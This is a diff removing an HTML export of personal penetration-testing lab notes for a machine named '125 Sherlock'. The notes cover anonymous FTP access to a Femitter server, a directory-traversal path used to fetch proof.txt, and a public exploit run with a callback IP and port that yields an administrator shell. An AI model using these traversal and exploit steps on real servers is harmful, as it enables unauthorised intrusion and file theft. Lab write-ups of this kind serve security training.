@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>125 Sherlock</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>125 Sherlock</h1><br/>nmap showed that 21 was the only open port, and was running femitter<br />anonymous login was enabled and I was able to browse files.<br />put fuckyou.txt       works! we can write to disk!! now to execute... <br />searchsploit told me that femitter allows directory browsing ../../../../<br />dir ../../../../Docume~1/admini~1/Bureau/           showed that I could see proof.txt   <br />                                                                            (Docume~1 because old windows machines cant read long names, just first 6 letters and ~1)<br />                                                                            (bureau because it is a french distro)<br /><br />get ../../../../Docume~1/admini~1/Bureau/proof.txt       &lt;failed<br /><br /> ftp&gt; recv<br />(remote-file) ../../../../Docume~1/admini~1/Bureau/proof.txt<br />(local-file) proof.txt<br />success<br /><br />now we can read proof.txt, but we still don&#39;t have a real shell.<br />google searching got me to<br /><a href="https://github.com/SinghDaljeet/SinghDaljeet.github.io/blob/master/_posts/2019-02-16-femitter.md">https://github.com/SinghDaljeet/SinghDaljeet.github.io/blob/master/_posts/2019-02-16-femitter.md</a><br /><br />python femitter.py 10.11.0.186 443<br />...<br />Administrateur!!! (rooted)<br /><br /><br /><br />                                                                         <br /></div></body></html>
